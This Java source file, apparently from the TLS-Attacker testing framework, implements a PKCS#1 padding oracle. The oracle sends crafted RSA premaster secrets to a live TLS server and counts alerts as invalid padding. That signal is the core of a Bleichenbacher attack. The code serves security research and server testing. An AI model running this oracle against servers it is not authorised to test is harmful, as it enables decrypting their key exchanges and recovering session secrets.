/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.pkcs1.oracles;

import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.tls.config.ClientCommandConfig;
import anonymous.tlsattacker.tls.config.ClientConfigHandler;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.constants.ConnectionEnd;
import anonymous.tlsattacker.tls.protocol.ProtocolMessage;
import anonymous.tlsattacker.tls.protocol.alert.AlertMessage;
import anonymous.tlsattacker.tls.protocol.ccs.ChangeCipherSpecMessage;
import anonymous.tlsattacker.tls.protocol.handshake.CertificateMessage;
import anonymous.tlsattacker.tls.protocol.handshake.RSAClientKeyExchangeMessage;
import anonymous.tlsattacker.tls.protocol.handshake.ServerHelloDoneMessage;
import anonymous.tlsattacker.tls.protocol.handshake.ServerHelloMessage;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.TlsContextAnalyzer;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTraceType;
import anonymous.tlsattacker.tls.workflow.WorkflowConfigurationFactory;
import anonymous.tlsattacker.transport.TransportHandler;
import anonymous.tlsattacker.util.MathHelper;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;

/**
 * 
 * @author anonymous anonymous <anonymous.anonymous@anonymous>
 */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    ClientCommandConfig config;

    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, ClientCommandConfig clientConfig) {
	this.publicKey = (RSAPublicKey) pubKey;
	this.blockSize = MathHelper.intceildiv(publicKey.getModulus().bitLength(), 8);
	this.config = clientConfig;
	this.config.setWorkflowTraceType(WorkflowTraceType.CLIENT_HELLO);

	LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
	Configuration ctxConfig = ctx.getConfiguration();
	LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
	loggerConfig.setLevel(Level.INFO);
	ctx.updateLoggers();
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {

	ConfigHandler configHandler = new ClientConfigHandler();
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	List<ProtocolMessage> protocolMessages = new LinkedList<>();
	protocolMessages.add(new ServerHelloMessage(ConnectionEnd.SERVER));
	protocolMessages.add(new CertificateMessage(ConnectionEnd.SERVER));
	protocolMessages.add(new ServerHelloDoneMessage(ConnectionEnd.SERVER));

	RSAClientKeyExchangeMessage cke = new RSAClientKeyExchangeMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(cke);
	protocolMessages.add(new ChangeCipherSpecMessage(ConnectionEnd.CLIENT));
	protocolMessages.add(new AlertMessage(ConnectionEnd.SERVER));

	ModifiableByteArray pms = new ModifiableByteArray();
	pms.setModification(ByteArrayModificationFactory.explicitValue(msg));
	cke.setEncryptedPremasterSecret(pms);

	WorkflowConfigurationFactory.appendProtocolMessagesToWorkflow(tlsContext, protocolMessages);

	if (numberOfQueries % 100 == 0) {
	    LOGGER.info("Number of queries so far: {}", numberOfQueries);
	}

	boolean valid = true;
	try {
	    workflowExecutor.executeWorkflow();
	} catch (Exception e) {
	    valid = false;
	    e.printStackTrace();
	} finally {
	    numberOfQueries++;
	    transportHandler.closeConnection();
	}

	if (TlsContextAnalyzer.containsAlertAfterModifiedMessage(tlsContext) == TlsContextAnalyzer.AnalyzerResponse.ALERT) {
	    valid = false;
	}

	return valid;
    }
}
